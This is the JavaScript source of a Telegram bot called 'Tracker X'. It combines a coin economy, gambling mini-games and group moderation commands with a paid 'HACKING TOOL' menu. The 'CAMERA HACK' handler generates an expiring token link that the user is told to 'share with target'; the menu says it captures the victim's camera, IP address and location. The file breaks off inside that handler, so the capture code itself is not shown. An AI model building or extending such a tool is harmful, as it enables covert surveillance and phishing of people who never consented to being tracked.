// =====================================================
// 🔱 TRACKER X v5.0 - COMPLETE WORKING EDITION 🔱
// =====================================================
// 👨‍💻 Dev: @Mrddev | 📢 Channel: @devxtechzone
// 🚀 FIXED: All callback queries working | No crashes
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

app.use(bodyParser.json({ limit: "50mb" }));
app.use(express.static(path.join(__dirname, "public")));

// ===== CONFIG =====
const DOMAIN = process.env.DOMAIN || "https://yourdomain.onrender.com";
const CHANNEL_USERNAME = "@devxtechzone";
const OWNER_ID = parseInt(process.env.OWNER_ID || "6170894121");
const BOT_VERSION = "5.0.0";

// ========== COIN SETTINGS ==========
const TRACKING_COST = 5;
const NEW_USER_COINS = 100;
const REFERRAL_REWARD = 10;
const DAILY_REWARD = 5;
const WORK_MIN = 5;
const WORK_MAX = 20;
const GAME_BET = 2;

// ========== DATABASES ==========
const users = new Map();
const activeTokens = new Map();
const redeemCodes = new Map();
const userWorkCooldown = new Map();
const userDailyCooldown = new Map();
const userStates = new Map(); // For tracking user input states

// Group Features
const antilinkGroups = new Set();
const antispamGroups = new Set();
const antispamUsers = new Map();
const welcomeMessages = new Map();
const goodbyeMessages = new Map();
const tagAllCooldown = new Map();

// Stats
const botStats = {
  startTime: Date.now(),
  totalCommands: 0,
  totalMessages: 0,
  totalUsers: 0,
  totalGroups: 0,
  totalCoinsGiven: 0,
  totalHacksUsed: 0,
  totalReferrals: 0,
  totalRedeems: 0
};

// ========== HELPER FUNCTIONS ==========
function formatMessage(text) {
  return text.trim();
}

async function safeReply(ctx, text, extra = {}) {
  try {
    return await ctx.reply(formatMessage(text), { parse_mode: "HTML", ...extra });
  } catch (err) {
    return await ctx.reply(formatMessage(text), extra);
  }
}

async function safeEdit(ctx, text, extra = {}) {
  try {
    if (ctx.callbackQuery && ctx.callbackQuery.message) {
      return await ctx.editMessageText(formatMessage(text), { 
        parse_mode: "HTML", 
        ...extra,
        reply_markup: extra.reply_markup || undefined
      });
    } else {
      return await ctx.reply(formatMessage(text), { parse_mode: "HTML", ...extra });
    }
  } catch (err) {
    if (err.message.includes("message is not modified")) {
      return null;
    }
    if (err.message.includes("message to edit")) {
      return await ctx.reply(formatMessage(text), { parse_mode: "HTML", ...extra });
    }
    console.error("Edit error:", err.message);
    return await ctx.reply(formatMessage(text), { parse_mode: "HTML", ...extra });
  }
}

async function isAdmin(ctx, userId) {
  try {
    const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, userId);
    return ["creator", "administrator"].includes(chatMember.status);
  } catch {
    return false;
  }
}

async function isUserJoined(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
    return ["creator", "administrator", "member"].includes(member.status);
  } catch {
    return false;
  }
}

// ========== USER INITIALIZATION ==========
function initUser(userId, referrerId = null) {
  if (!users.has(userId)) {
    const userData = {
      id: userId,
      joinDate: Date.now(),
      coins: NEW_USER_COINS,
      bank: 0,
      totalEarned: NEW_USER_COINS,
      totalSpent: 0,
      referrals: 0,
      referrer: referrerId,
      level: 1,
      xp: 0,
      dailyStreak: 0,
      lastDaily: null,
      gamesPlayed: 0,
      gamesWon: 0,
      gamesLost: 0,
      usedHacks: 0,
      badges: ["🎁 New User"]
    };
    users.set(userId, userData);
    botStats.totalUsers++;
    botStats.totalCoinsGiven += NEW_USER_COINS;
    
    if (referrerId && users.has(referrerId)) {
      const referrer = users.get(referrerId);
      referrer.coins += REFERRAL_REWARD;
      referrer.referrals++;
      referrer.totalEarned += REFERRAL_REWARD;
      users.set(referrerId, referrer);
      botStats.totalReferrals++;
      
      bot.telegram.sendMessage(referrerId, formatMessage(`
🎉 NEW REFERRAL!

Someone joined using your link!
💰 You got +${REFERRAL_REWARD} COINS
📊 Total Referrals: ${referrer.referrals}
      `)).catch(() => {});
    }
  }
  return users.get(userId);
}

function addCoins(userId, amount, reason) {
  const user = users.get(userId);
  if (user) {
    user.coins += amount;
    user.totalEarned += amount;
    users.set(userId, user);
    botStats.totalCoinsGiven += amount;
    return true;
  }
  return false;
}

function removeCoins(userId, amount, reason) {
  const user = users.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    user.totalSpent += amount;
    users.set(userId, user);
    return true;
  }
  return false;
}

function generateRedeemCode(coins, maxUses = 1, expiresInHours = 24) {
  const code = crypto.randomBytes(6).toString("hex").toUpperCase();
  redeemCodes.set(code, {
    coins: coins,
    usedBy: [],
    maxUses: maxUses,
    remainingUses: maxUses,
    createdBy: OWNER_ID,
    createdAt: Date.now(),
    expiresAt: Date.now() + (expiresInHours * 60 * 60 * 1000)
  });
  return code;
}

function redeemCode(userId, code) {
  const codeData = redeemCodes.get(code.toUpperCase());
  if (!codeData) return { success: false, message: "❌ Invalid code!" };
  if (Date.now() > codeData.expiresAt) return { success: false, message: "❌ Code expired!" };
  if (codeData.remainingUses <= 0) return { success: false, message: "❌ Code used up!" };
  if (codeData.usedBy.includes(userId)) return { success: false, message: "❌ Already used!" };
  
  addCoins(userId, codeData.coins, `Redeemed code: ${code}`);
  codeData.usedBy.push(userId);
  codeData.remainingUses--;
  redeemCodes.set(code, codeData);
  botStats.totalRedeems++;
  return { success: true, message: `✅ Redeemed ${codeData.coins} coins!`, coins: codeData.coins };
}

// ========== MAIN MENU ==========
function mainMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🎯 HACKING TOOL", callback_data: "tracking_menu" }, { text: "👑 GROUP TOOLS", callback_data: "group_menu" }],
        [{ text: "🎮 GAMES ZONE", callback_data: "games_menu" }, { text: "💰 ECONOMY", callback_data: "economy_menu" }],
        [{ text: "🏆 LEADERBOARD", callback_data: "leaderboard_menu" }, { text: "👤 PROFILE", callback_data: "profile" }],
        [{ text: "🎁 REDEEM", callback_data: "redeem_menu" }, { text: "🔗 REFERRAL", callback_data: "referral_info" }],
        [{ text: "📢 CHANNEL", url: "https://t.me/devxtechzone" }, { text: "👨‍💻 DEV", url: "https://t.me/Mrddev" }]
      ]
    }
  };
}

function trackingMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🎱 CAMERA HACK", callback_data: "pool_hack" }, { text: "⚡ IP HACK", callback_data: "ip_hack" }],
        [{ text: "◀️ BACK", callback_data: "main_back" }]
      ]
    }
  };
}

function groupMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔊 TAG ALL", callback_data: "tagall" }, { text: "👋 WELCOME", callback_data: "set_welcome" }],
        [{ text: "🚫 ANTILINK", callback_data: "antilink_toggle" }, { text: "🛡️ ANTISPAM", callback_data: "antispam_toggle" }],
        [{ text: "⚠️ WARN", callback_data: "warn_help" }, { text: "🔨 KICK", callback_data: "kick_help" }],
        [{ text: "🚫 BAN", callback_data: "ban_help" }, { text: "🔇 MUTE", callback_data: "mute_help" }],
        [{ text: "📊 GROUP STATS", callback_data: "group_stats" }, { text: "◀️ BACK", callback_data: "main_back" }]
      ]
    }
  };
}

function gamesMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🎲 DICE (33%)", callback_data: "dice_game" }, { text: "🎰 SLOTS (15%)", callback_data: "slots_game" }],
        [{ text: "🪙 COIN FLIP (40%)", callback_data: "coinflip" }, { text: "🔥 HIGH RISK (20%)", callback_data: "high_risk" }],
        [{ text: "🔢 GUESS", callback_data: "guess_help" }, { text: "✊ RPS", callback_data: "rps_help" }],
        [{ text: "🏆 LEADERBOARD", callback_data: "game_leaderboard" }, { text: "◀️ BACK", callback_data: "main_back" }]
      ]
    }
  };
}

function economyMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "💰 DAILY", callback_data: "daily" }, { text: "💼 WORK", callback_data: "work" }],
        [{ text: "🏆 LEADERBOARD", callback_data: "coin_leaderboard" }, { text: "🎁 REFERRAL", callback_data: "referral_info" }],
        [{ text: "◀️ BACK", callback_data: "main_back" }]
      ]
    }
  };
}

function leaderboardMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "💰 COINS", callback_data: "lb_coins" }, { text: "🎮 GAMES", callback_data: "lb_games" }],
        [{ text: "👥 REFERRALS", callback_data: "lb_referrals" }, { text: "⭐ LEVEL", callback_data: "lb_level" }],
        [{ text: "◀️ BACK", callback_data: "main_back" }]
      ]
    }
  };
}

// ========== BOT START ==========
bot.start(async (ctx) => {
  let referrerId = null;
  const args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) {
    referrerId = parseInt(args[1].replace("ref_", ""));
    if (isNaN(referrerId)) referrerId = null;
  }
  
  const user = initUser(ctx.from.id, referrerId);
  
  await safeReply(ctx, `
╔══════════════════════════════════╗
║     🔱 TRACKER X v5.0           ║
║     ⚡ COMPLETE EDITION         ║
╚══════════════════════════════════╝

✨ <b>Welcome ${ctx.from.first_name}!</b>

┌─────────────────────────────────┐
│ 💰 Balance: ${user.coins} coins          │
│ 📊 Level: ${user.level}                    │
│ 👥 Referrals: ${user.referrals}            │
└─────────────────────────────────┘

🎁 <b>You got ${NEW_USER_COINS} FREE coins!</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 <b>Select a module below</b>
`, mainMenu());
});

// ========== MENU NAVIGATION ==========
bot.action("main_back", async (ctx) => {
  const user = initUser(ctx.from.id);
  await safeEdit(ctx, `
╔══════════════════════════════════╗
║     🔱 TRACKER X v5.0           ║
║     ⚡ COMPLETE EDITION         ║
╚══════════════════════════════════╝

💰 <b>Balance:</b> ${user.coins} coins
📊 <b>Level:</b> ${user.level}
👥 <b>Referrals:</b> ${user.referrals}

🎯 <b>Select a module below</b>
`, mainMenu());
  await ctx.answerCbQuery();
});

bot.action("tracking_menu", async (ctx) => {
  await safeEdit(ctx, `
🎯 <b>TRACKER X MODULE</b>

⚠️ Cost: ${TRACKING_COST} coins per hack
⏱️ Token expires in 10 minutes
📸 Captures: Camera + IP + Location
  `, trackingMenu());
  await ctx.answerCbQuery();
});

bot.action("group_menu", async (ctx) => {
  await safeEdit(ctx, `
👑 <b>GROUP MANAGEMENT</b>

Admin tools for group moderation!
  `, groupMenu());
  await ctx.answerCbQuery();
});

bot.action("games_menu", async (ctx) => {
  await safeEdit(ctx, `
🎮 <b>GAMES ZONE</b>

💰 Cost: ${GAME_BET} coins per game
⚠️ Hard win rates - gamble wisely!
🎯 Win up to 10x your bet!
  `, gamesMenu());
  await ctx.answerCbQuery();
});

bot.action("economy_menu", async (ctx) => {
  const user = initUser(ctx.from.id);
  await safeEdit(ctx, `
💰 <b>ECONOMY SYSTEM</b>

💰 <b>Your Balance:</b> ${user.coins} coins
📈 <b>Total Earned:</b> ${user.totalEarned}

<b>💰 Earning Methods:</b>
• Daily reward - ${DAILY_REWARD} coins
• Work - ${WORK_MIN}-${WORK_MAX} coins
• Referrals - ${REFERRAL_REWARD} coins each
• Games - Win big!
• Redeem codes
  `, economyMenu());
  await ctx.answerCbQuery();
});

bot.action("leaderboard_menu", async (ctx) => {
  await safeEdit(ctx, `
🏆 <b>TRACKER X LEADERBOARDS</b>

View top users across different categories!
  `, leaderboardMenu());
  await ctx.answerCbQuery();
});

// ========== LEADERBOARDS ==========
bot.action("lb_coins", async (ctx) => {
  const sorted = Array.from(users.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
  let msg = "🏆 <b>💰 RICHEST USERS</b> 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) {
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    msg += `${medal} <code>${sorted[i].id}</code> - ${sorted[i].coins} coins\n`;
  }
  await safeReply(ctx, msg);
  await ctx.answerCbQuery();
});

bot.action("lb_games", async (ctx) => {
  const sorted = Array.from(users.values()).sort((a, b) => b.gamesWon - a.gamesWon).slice(0, 10);
  let msg = "🏆 <b>🎮 TOP GAMERS</b> 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) {
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    msg += `${medal} <code>${sorted[i].id}</code> - ${sorted[i].gamesWon} wins\n`;
  }
  await safeReply(ctx, msg);
  await ctx.answerCbQuery();
});

bot.action("lb_referrals", async (ctx) => {
  const sorted = Array.from(users.values()).sort((a, b) => b.referrals - a.referrals).slice(0, 10);
  let msg = "🏆 <b>👥 TOP REFERRERS</b> 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) {
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    msg += `${medal} <code>${sorted[i].id}</code> - ${sorted[i].referrals} referrals\n`;
  }
  await safeReply(ctx, msg);
  await ctx.answerCbQuery();
});

bot.action("lb_level", async (ctx) => {
  const sorted = Array.from(users.values()).sort((a, b) => b.level - a.level).slice(0, 10);
  let msg = "🏆 <b>⭐ TOP LEVELS</b> 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) {
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    msg += `${medal} <code>${sorted[i].id}</code> - Level ${sorted[i].level}\n`;
  }
  await safeReply(ctx, msg);
  await ctx.answerCbQuery();
});

bot.action("coin_leaderboard", async (ctx) => {
  const sorted = Array.from(users.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
  let msg = "🏆 <b>💰 RICHEST USERS</b> 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) {
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    msg += `${medal} <code>${sorted[i].id}</code> - ${sorted[i].coins} coins\n`;
  }
  await safeReply(ctx, msg);
  await ctx.answerCbQuery();
});

bot.action("game_leaderboard", async (ctx) => {
  const sorted = Array.from(users.values()).sort((a, b) => b.gamesWon - a.gamesWon).slice(0, 10);
  let msg = "🏆 <b>🎮 TOP GAMERS</b> 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) {
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    msg += `${medal} <code>${sorted[i].id}</code> - ${sorted[i].gamesWon} wins\n`;
  }
  await safeReply(ctx, msg);
  await ctx.answerCbQuery();
});

// ========== GAMES ==========
bot.action("dice_game", async (ctx) => {
  const user = initUser(ctx.from.id);
  if (user.coins < GAME_BET) {
    return ctx.answerCbQuery(`❌ Need ${GAME_BET} coins!`, { show_alert: true });
  }
  
  removeCoins(ctx.from.id, GAME_BET, "Dice game");
  const roll = Math.floor(Math.random() * 6) + 1;
  const win = roll === 5 || roll === 6;
  
  if (win) {
    const winnings = GAME_BET * 2;
    addCoins(ctx.from.id, winnings, "Won dice");
    user.gamesWon++;
    await ctx.replyWithDice();
    await safeReply(ctx, `🎲 You rolled ${roll} and WON!\n💰 +${winnings} coins!`);
  } else {
    await ctx.replyWithDice();
    await safeReply(ctx, `🎲 You rolled ${roll} and LOST!\n💸 -${GAME_BET} coin!`);
    user.gamesLost++;
  }
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
  await ctx.answerCbQuery();
});

bot.action("slots_game", async (ctx) => {
  const user = initUser(ctx.from.id);
  if (user.coins < GAME_BET) {
    return ctx.answerCbQuery(`❌ Need ${GAME_BET} coins!`, { show_alert: true });
  }
  
  removeCoins(ctx.from.id, GAME_BET, "Slots");
  const slots = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎"];
  const result = [slots[Math.floor(Math.random() * 6)], slots[Math.floor(Math.random() * 6)], slots[Math.floor(Math.random() * 6)]];
  const isJackpot = result[0] === result[1] && result[1] === result[2];
  const isPair = !isJackpot && (result[0] === result[1] || result[1] === result[2] || result[0] === result[2]);
  
  let winnings = 0;
  let msg = "";
  
  if (isJackpot) {
    winnings = GAME_BET * 10;
    msg = `🎰 JACKPOT! ${result.join(" ")}\n💰 +${winnings} coins!`;
  } else if (isPair) {
    winnings = GAME_BET * 2;
    msg = `🎰 Pair! ${result.join(" ")}\n💰 +${winnings} coins!`;
  } else {
    msg = `🎰 ${result.join(" ")}\n💸 -${GAME_BET} coin!`;
    user.gamesLost++;
  }
  
  if (winnings > 0) {
    addCoins(ctx.from.id, winnings, "Won slots");
    user.gamesWon++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
  await safeReply(ctx, msg);
  await ctx.answerCbQuery();
});

bot.action("coinflip", async (ctx) => {
  const user = initUser(ctx.from.id);
  if (user.coins < GAME_BET) {
    return ctx.answerCbQuery(`❌ Need ${GAME_BET} coins!`, { show_alert: true });
  }
  
  removeCoins(ctx.from.id, GAME_BET, "Coin flip");
  const win = Math.random() < 0.4;
  
  if (win) {
    const winnings = GAME_BET * 2;
    addCoins(ctx.from.id, winnings, "Won coin flip");
    user.gamesWon++;
    await safeReply(ctx, `🪙 Heads! You WIN!\n💰 +${winnings} coins!`);
  } else {
    await safeReply(ctx, `🪙 Tails! You LOST!\n💸 -${GAME_BET} coin!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
  await ctx.answerCbQuery();
});

bot.action("high_risk", async (ctx) => {
  const user = initUser(ctx.from.id);
  const bet = 5;
  if (user.coins < bet) {
    return ctx.answerCbQuery(`❌ Need ${bet} coins!`, { show_alert: true });
  }
  
  removeCoins(ctx.from.id, bet, "High risk");
  const win = Math.random() < 0.2;
  
  if (win) {
    const winnings = bet * 10;
    addCoins(ctx.from.id, winnings, "Won high risk");
    user.gamesWon++;
    await safeReply(ctx, `🔥 HIGH RISK - YOU WON!\n💰 +${winnings} coins!`);
  } else {
    await safeReply(ctx, `💀 HIGH RISK - YOU LOST!\n💸 -${bet} coins!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
  await ctx.answerCbQuery();
});

bot.action("guess_help", async (ctx) => {
  await safeEdit(ctx, `
🔢 <b>GUESS NUMBER GAME</b>

Command: <code>/guess &lt;number&gt;</code>
Cost: ${GAME_BET} coins
Win Rate: 10%
Win Prize: ${GAME_BET * 5} coins

<i>Guess a number between 1-10!</i>
  `);
  await ctx.answerCbQuery();
});

bot.action("rps_help", async (ctx) => {
  await safeEdit(ctx, `
✊ <b>ROCK PAPER SCISSORS</b>

Command: <code>/rps &lt;rock/paper/scissors&gt;</code>
Cost: ${GAME_BET} coins
Win Rate: 33%
Win Prize: ${GAME_BET * 2} coins

<i>Challenge the bot!</i>
  `);
  await ctx.answerCbQuery();
});

// ========== ECONOMY ==========
bot.action("daily", async (ctx) => {
  const user = initUser(ctx.from.id);
  const now = Date.now();
  const dayInMs = 24 * 60 * 60 * 1000;
  
  if (user.lastDaily && now - user.lastDaily < dayInMs) {
    const remaining = dayInMs - (now - user.lastDaily);
    const hours = Math.floor(remaining / 3600000);
    return ctx.answerCbQuery(`⏰ Come back in ${hours} hours!`, { show_alert: true });
  }
  
  let streak = user.dailyStreak || 0;
  if (user.lastDaily && now - user.lastDaily < dayInMs * 2) streak++;
  else streak = 1;
  
  const bonus = Math.min(streak, 10);
  const reward = DAILY_REWARD + bonus;
  addCoins(ctx.from.id, reward, "Daily reward");
  user.dailyStreak = streak;
  user.lastDaily = now;
  users.set(ctx.from.id, user);
  
  await safeReply(ctx, `🎁 Daily reward: +${reward} coins!\n🔥 Streak: ${streak} days\n💰 New balance: ${user.coins + reward}`);
  await ctx.answerCbQuery();
});

bot.action("work", async (ctx) => {
  const userId = ctx.from.id;
  const now = Date.now();
  const lastWork = userWorkCooldown.get(userId) || 0;
  
  if (now - lastWork < 3600000) {
    const minutes = Math.ceil((3600000 - (now - lastWork)) / 60000);
    return ctx.answerCbQuery(`⏰ Rest ${minutes} minutes!`, { show_alert: true });
  }
  
  const jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Gamer", "🍕 Delivery", "📚 Teacher", "🔧 Mechanic", "🚗 Driver", "👨‍🍳 Chef", "💪 Trainer"];
  const job = jobs[Math.floor(Math.random() * jobs.length)];
  const reward = Math.floor(Math.random() * (WORK_MAX - WORK_MIN + 1) + WORK_MIN);
  
  addCoins(userId, reward, `Worked as ${job}`);
  userWorkCooldown.set(userId, now);
  await safeReply(ctx, `💼 Worked as ${job}!\n💰 +${reward} coins!\n💰 Balance: ${users.get(userId).coins}`);
  await ctx.answerCbQuery();
});

// ========== PROFILE ==========
bot.action("profile", async (ctx) => {
  const user = initUser(ctx.from.id);
  const winRate = user.gamesPlayed > 0 ? ((user.gamesWon / user.gamesPlayed) * 100).toFixed(1) : 0;
  
  await safeEdit(ctx, `
╔══════════════════════════╗
║  👤 USER PROFILE        ║
╚══════════════════════════╝

<b>📝 Basic Info:</b>
• Name: ${ctx.from.first_name}
• Username: @${ctx.from.username || 'None'}
• ID: <code>${ctx.from.id}</code>

<b>💰 Economy:</b>
• Coins: ${user.coins}
• Bank: ${user.bank}
• Total Earned: ${user.totalEarned}
• Total Spent: ${user.totalSpent}

<b>📊 Stats:</b>
• Level: ${user.level}
• XP: ${user.xp}/${user.level * 100}
• Referrals: ${user.referrals}
• Hacks Used: ${user.usedHacks}
• Games: ${user.gamesWon}W / ${user.gamesLost}L
• Win Rate: ${winRate}%

<b>🏆 Badges:</b>
${user.badges.map(b => `• ${b}`).join('\n')}
  `, mainMenu());
  await ctx.answerCbQuery();
});

bot.action("stats", async (ctx) => {
  await safeEdit(ctx, `
╔══════════════════════════╗
║  📊 BOT STATISTICS      ║
╚══════════════════════════╝

<b>🤖 Bot Stats:</b>
• Version: ${BOT_VERSION}
• Uptime: ${Math.floor((Date.now() - botStats.startTime) / 86400000)} days
• Total Users: ${botStats.totalUsers}
• Total Groups: ${botStats.totalGroups}

<b>💰 Economy:</b>
• Total Coins Given: ${botStats.totalCoinsGiven}
• Total Referrals: ${botStats.totalReferrals}
• Total Hacks Used: ${botStats.totalHacksUsed}
• Total Redeems: ${botStats.totalRedeems}
  `, mainMenu());
  await ctx.answerCbQuery();
});

// ========== REDEEM ==========
bot.action("redeem_menu", async (ctx) => {
  await safeEdit(ctx, `
╔══════════════════════════╗
║  🎁 REDEEM CODE        ║
╚══════════════════════════╝

<b>Enter your redeem code:</b>

Type: <code>/redeem YOUR_CODE</code>

━━━━━━━━━━━━━━━━━━━━━━━━━

<i>Get codes from giveaways and events!</i>
  `);
  await ctx.answerCbQuery();
});

bot.command("redeem", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return safeReply(ctx, "❌ Usage: /redeem <CODE>");
  }
  
  const result = redeemCode(ctx.from.id, args[1]);
  await safeReply(ctx, result.message);
});

// ========== REFERRAL ==========
bot.action("referral_info", async (ctx) => {
  const user = initUser(ctx.from.id);
  const link = `https://t.me/${bot.botInfo?.username || 'TrackerXBot'}?start=ref_${ctx.from.id}`;
  
  await safeEdit(ctx, `
╔══════════════════════════╗
║  🔗 REFERRAL SYSTEM     ║
╚══════════════════════════╝

<b>Your Referral Link:</b>
<code>${link}</code>

<b>📊 Your Stats:</b>
• Referrals: ${user.referrals}
• Coins Earned: ${user.referrals * REFERRAL_REWARD}
• Total Coins: ${user.coins}

<b>🎁 Rewards:</b>
• ${REFERRAL_REWARD} coins per referral
• 🏆 "Recruiter" badge at 10 referrals
• 💎 Bonus 20 coins at 25 referrals
  `, mainMenu());
  await ctx.answerCbQuery();
});

// ========== GROUP FEATURES ==========
bot.action("tagall", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  if (!await isAdmin(ctx, ctx.from.id)) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  const now = Date.now();
  const lastTag = tagAllCooldown.get(ctx.chat.id) || 0;
  if (now - lastTag < 300000) {
    const minutes = Math.ceil((300000 - (now - lastTag)) / 60000);
    return ctx.answerCbQuery(`⏰ Wait ${minutes} minutes!`, { show_alert: true });
  }
  
  await ctx.answerCbQuery("📢 Tagging members...");
  
  try {
    const admins = await ctx.telegram.getChatAdministrators(ctx.chat.id);
    let mentions = [];
    
    for (const admin of admins.slice(0, 20)) {
      if (admin.user.username) {
        mentions.push(`@${admin.user.username}`);
      } else {
        mentions.push(`[${admin.user.first_name}](tg://user?id=${admin.user.id})`);
      }
    }
    
    await ctx.reply(`📢 **ANNOUNCEMENT**\n\n${mentions.join(" ")}`, { parse_mode: "Markdown" });
    tagAllCooldown.set(ctx.chat.id, now);
  } catch (err) {
    await safeReply(ctx, "❌ Failed to tag members!");
  }
});

bot.action("antilink_toggle", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  if (!await isAdmin(ctx, ctx.from.id)) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  if (antilinkGroups.has(ctx.chat.id)) {
    antilinkGroups.delete(ctx.chat.id);
    await safeReply(ctx, "🚫 Anti-link DISABLED!");
  } else {
    antilinkGroups.add(ctx.chat.id);
    await safeReply(ctx, "✅ Anti-link ENABLED!");
  }
  await ctx.answerCbQuery();
});

bot.action("antispam_toggle", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  if (!await isAdmin(ctx, ctx.from.id)) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  if (antispamGroups.has(ctx.chat.id)) {
    antispamGroups.delete(ctx.chat.id);
    await safeReply(ctx, "🛡️ Anti-spam DISABLED!");
  } else {
    antispamGroups.add(ctx.chat.id);
    await safeReply(ctx, "✅ Anti-spam ENABLED!");
  }
  await ctx.answerCbQuery();
});

bot.action("set_welcome", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  if (!await isAdmin(ctx, ctx.from.id)) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  userStates.set(ctx.from.id, { action: "set_welcome", chatId: ctx.chat.id });
  await safeEdit(ctx, `
👋 <b>SET WELCOME MESSAGE</b>

Send the welcome message you want to set.

<b>Variables:</b>
• {name} - User's name
• {group} - Group name

<i>Example: Welcome {name} to {group}! 🎉</i>

Send your message now:
  `);
  await ctx.answerCbQuery();
});

bot.action("set_goodbye", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  if (!await isAdmin(ctx, ctx.from.id)) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  userStates.set(ctx.from.id, { action: "set_goodbye", chatId: ctx.chat.id });
  await safeEdit(ctx, `
👋 <b>SET GOODBYE MESSAGE</b>

Send the goodbye message you want to set.

<b>Variables:</b>
• {name} - User's name
• {group} - Group name

<i>Example: Goodbye {name}! We'll miss you! 👋</i>

Send your message now:
  `);
  await ctx.answerCbQuery();
});

bot.action("group_stats", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  try {
    const chat = await ctx.telegram.getChat(ctx.chat.id);
    const admins = await ctx.telegram.getChatAdministrators(ctx.chat.id);
    const memberCount = await ctx.telegram.getChatMembersCount(ctx.chat.id);
    
    await safeReply(ctx, `
📊 <b>GROUP STATISTICS</b>

<b>📝 Group Info:</b>
• Name: ${chat.title}
• ID: <code>${ctx.chat.id}</code>
• Members: ${memberCount}
• Admins: ${admins.length}

<b>⚙️ Settings:</b>
• Anti-link: ${antilinkGroups.has(ctx.chat.id) ? "✅ ON" : "❌ OFF"}
• Anti-spam: ${antispamGroups.has(ctx.chat.id) ? "✅ ON" : "❌ OFF"}
• Welcome: ${welcomeMessages.has(ctx.chat.id) ? "✅ SET" : "❌ NOT SET"}
• Goodbye: ${goodbyeMessages.has(ctx.chat.id) ? "✅ SET" : "❌ NOT SET"}
    `);
  } catch (err) {
    await safeReply(ctx, "❌ Failed to get group stats!");
  }
  await ctx.answerCbQuery();
});

bot.action("warn_help", async (ctx) => {
  await safeEdit(ctx, `
⚠️ <b>WARN SYSTEM</b>

Reply to a user's message with:
<code>/warn</code>

<b>Rules:</b>
• 3 warnings = automatic ban
• Warnings reset after 24 hours
  `);
  await ctx.answerCbQuery();
});

bot.action("kick_help", async (ctx) => {
  await safeEdit(ctx, `
🔨 <b>KICK USER</b>

Reply to a user's message with:
<code>/kick</code>
  `);
  await ctx.answerCbQuery();
});

bot.action("ban_help", async (ctx) => {
  await safeEdit(ctx, `
🚫 <b>BAN USER</b>

Reply to a user's message with:
<code>/ban</code>
  `);
  await ctx.answerCbQuery();
});

bot.action("mute_help", async (ctx) => {
  await safeEdit(ctx, `
🔇 <b>MUTE USER</b>

Reply to a user's message with:
<code>/mute &lt;minutes&gt;</code>

<i>Example: /mute 30</i>
  `);
  await ctx.answerCbQuery();
});

// ========== HACKING FEATURES ==========
bot.action("pool_hack", async (ctx) => {
  const user = initUser(ctx.from.id);
  if (user.coins < TRACKING_COST) {
    return ctx.answerCbQuery(`❌ Need ${TRACKING_COST} coins!`, { show_alert: true });
  }
  
  removeCoins(ctx.from.id, TRACKING_COST, "Pool hack");
  const token = generateToken();
  
  activeTokens.set(token, {
    chatId: ctx.chat.id,
    userId: ctx.from.id,
    mode: "pool",
    createdAt: Date.now()
  });
  
  setTimeout(() => activeTokens.delete(token), 10 * 60 * 1000);
  
  await safeReply(ctx, `
✅ <b>CAMERA HACK INITIALIZED!</b>

💰 Coins: -${TRACKING_COST}
⏱️ Token expires in 10 minutes

<b>Share this link with target:</b>
<code>${DOMAIN}?token=${token}</code>

⚠️ <i>Link expires in 10 minutes!</i>
